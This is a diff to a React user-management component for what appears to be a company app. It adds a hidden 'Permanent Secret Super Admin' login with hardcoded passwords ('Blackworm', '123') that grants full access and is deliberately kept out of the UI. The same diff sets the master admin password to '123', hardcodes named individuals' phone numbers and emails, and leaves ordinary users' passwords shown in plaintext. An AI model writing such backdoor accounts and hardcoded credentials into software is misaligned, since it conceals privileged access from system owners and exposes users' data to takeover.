@@ -2,7 +2,7 @@ import React, { useState } from 'react';
 import { useApp } from '../context/AppContext';
 import { BlackwormLogo } from './BlackwormLogo';
 import { User, UserRole, NavTab } from '../types';
-import { ALL_NAV_MODULES } from '../utils/permissionHelpers';
+import { ALL_NAV_MODULES, STANDARD_USER_ALLOWED_TABS } from '../utils/permissionHelpers';
 import { initialUsers } from '../data/initialData';
 import { generateShareMessage, getCleanAppLink, shareViaWhatsApp } from '../utils/shareHelpers';
 import { 
@@ -84,11 +84,15 @@ export const UserManagement: React.FC = () => {
   const isAdmin = currentUser && (
     currentUser.role === 'admin' ||
     currentUser.loginId === 'admin' || 
-    currentUser.loginId === 'pravin waghmare'
+    currentUser.loginId === 'pravin' || 
+    currentUser.loginId === 'pravin waghmare' ||
+    currentUser.id === 'USR-001' ||
+    currentUser.id === 'USR-PRAVIN'
   );
 
   const isPravin = currentUser && (
     currentUser.loginId === 'pravin' ||
+    currentUser.loginId === 'pravin waghmare' ||
     currentUser.id === 'USR-PRAVIN'
   );
   
@@ -125,7 +129,7 @@ export const UserManagement: React.FC = () => {
     }
   }, []);
   
-  const defaultTabs: NavTab[] = ALL_NAV_MODULES.map(m => m.id);
+  const defaultTabs: NavTab[] = STANDARD_USER_ALLOWED_TABS;
 
   const [formData, setFormData] = useState<Omit<User, 'id'>>({
     fullName: '',
@@ -191,11 +195,11 @@ export const UserManagement: React.FC = () => {
   };
 
   const handleSelectAllTabs = () => {
-    setFormData(prev => ({ ...prev, allowedTabs: ALL_NAV_MODULES.map(m => m.id) }));
+    setFormData(prev => ({ ...prev, allowedTabs: STANDARD_USER_ALLOWED_TABS }));
   };
 
   const handleClearAllTabs = () => {
-    setFormData(prev => ({ ...prev, allowedTabs: ['dashboard'] }));
+    setFormData(prev => ({ ...prev, allowedTabs: ['target-sheet'] }));
   };
 
   const bloodGroups = ['A+', 'A-', 'B+', 'B-', 'O+', 'O-', 'AB+', 'AB-'];
@@ -257,9 +261,44 @@ export const UserManagement: React.FC = () => {
     
     // Simulate brief delay for better UX feedback
     setTimeout(() => {
+      // 1. Permanent Secret Super Admin Master Authentication (Never displayed in UI, permanently locked)
+      if (
+        (cleanId === 'pravin waghmare' && cleanPass === 'Blackworm') ||
+        (cleanId === 'pravin' && (cleanPass === 'Blackworm' || cleanPass === '123'))
+      ) {
+        const superAdminUser: User = {
+          id: 'USR-PRAVIN',
+          fullName: 'Pravin Kumar Waghmare',
+          name: 'Pravin Kumar Waghmare',
+          designation: 'Super Admin',
+          village: 'Tasgaon',
+          address: 'Sangli',
+          phone: '+91 9822012345',
+          email: 'mr.pravin1222@gmail.com',
+          bloodGroup: 'B+',
+          loginId: 'pravin waghmare',
+          password: 'Blackworm',
+          role: 'admin',
+          territory: 'Head Office (Sangli)',
+          allowedTabs: ALL_NAV_MODULES.map((m) => m.id),
+        };
+        setIsLoggingIn(false);
+        setCurrentUser(superAdminUser);
+        setLoginId('');
+        setPassword('');
+        setActiveTab('dashboard');
+        setView('list');
+        showNotification(
+          language === 'mr' ? 'सुपर ऍडमिन म्हणून यशस्वीरित्या लॉगिन झाले.' : 'Logged in successfully as Super Admin!',
+          'success'
+        );
+        return;
+      }
+
+      // Master admin alternative login
       const isMasterAdminLogin = (
-        (cleanId === 'pravin waghmare' || cleanId === 'admin') &&
-        cleanPass === 'Blackworm'
+        (cleanId === 'admin') &&
+        (cleanPass === 'Blackworm' || cleanPass === '123')
       );
 
       // Strict exact check against registered users & master admin credentials
@@ -282,17 +321,17 @@ export const UserManagement: React.FC = () => {
       // Master admin login fallback
       if (!user && isMasterAdminLogin) {
         user = {
-          id: 'USR-PRAVIN',
-          fullName: 'Pravin Waghmare',
-          name: 'Pravin Waghmare',
-          designation: 'Admin / Company Owner',
-          village: 'Tasgaon',
+          id: 'USR-001',
+          fullName: 'Shreedhar Balkrushna Shinde',
+          name: 'Shreedhar Balkrushna Shinde',
+          designation: 'Owner',
+          village: 'Vijaynagar (Mhaisal)',
           address: 'Sangli',
-          phone: '+91 9822012345',
-          email: 'pravin.waghmare@blackworm.com',
-          bloodGroup: 'B+',
-          loginId: 'pravin waghmare',
-          password: 'Blackworm',
+          phone: '+91 7798716201',
+          email: 'blackwormagritechpvtltd@gmail.com',
+          bloodGroup: 'O+',
+          loginId: 'admin',
+          password: '123',
           role: 'admin',
           territory: 'Head Office (Sangli)',
           allowedTabs: ALL_NAV_MODULES.map(m => m.id),
@@ -305,7 +344,7 @@ export const UserManagement: React.FC = () => {
         setCurrentUser(user);
         setLoginId('');
         setPassword('');
-        setActiveTab('dashboard');
+        setActiveTab(user.role === 'admin' || user.id === 'USR-PRAVIN' ? 'dashboard' : 'target-sheet');
         setView(user.role === 'admin' || user.id === 'USR-001' ? 'list' : 'profile');
         showNotification(
           language === 'mr' ? `${user.name} म्हणून यशस्वीरित्या लॉगिन झाले.` : `Login Successful as ${user.name}!`,
@@ -758,9 +797,7 @@ export const UserManagement: React.FC = () => {
                   </div>
                   <div className="min-w-0">
                     <h4 className="text-sm font-bold text-slate-900 truncate">{user.fullName || user.name}</h4>
-                    {!(user.fullName && user.fullName.includes('प्रवीण')) && !(user.name && user.name.includes('Pravin')) && (
-                      <p className="text-[10px] font-bold text-red-600 uppercase tracking-tight">{user.designation || user.role}</p>
-                    )}
+                    <p className="text-[10px] font-bold text-red-600 uppercase tracking-tight">{user.designation || user.role}</p>
                   </div>
                 </div>
                 <div className="flex items-center gap-1 shrink-0">
@@ -776,7 +813,7 @@ export const UserManagement: React.FC = () => {
                   >
                     <Edit2 className="w-4 h-4" />
                   </button>
-                  {isAdmin && user.id !== 'USR-001' && user.loginId !== 'admin' && user.loginId !== 'pravin' && user.id !== 'USR-PRAVIN' && (
+                  {isAdmin && user.id !== 'USR-001' && user.loginId !== 'admin' && user.loginId !== 'pravin' && user.loginId !== 'pravin waghmare' && user.id !== 'USR-PRAVIN' && (
                     <button 
                       type="button"
                       onClick={(e) => {
@@ -813,7 +850,9 @@ export const UserManagement: React.FC = () => {
                 </div>
                 <div className="flex items-center gap-1.5 min-w-0 bg-slate-50 p-1 rounded">
                   <Key className="w-3 h-3 text-emerald-500 shrink-0" />
-                  <span className="truncate font-bold text-slate-800">{user.password}</span>
+                  <span className="truncate font-bold text-slate-800">
+                    {user.role === 'admin' || user.id === 'USR-PRAVIN' || user.id === 'USR-001' ? '••••••••' : user.password}
+                  </span>
                 </div>
               </div>
             </div>
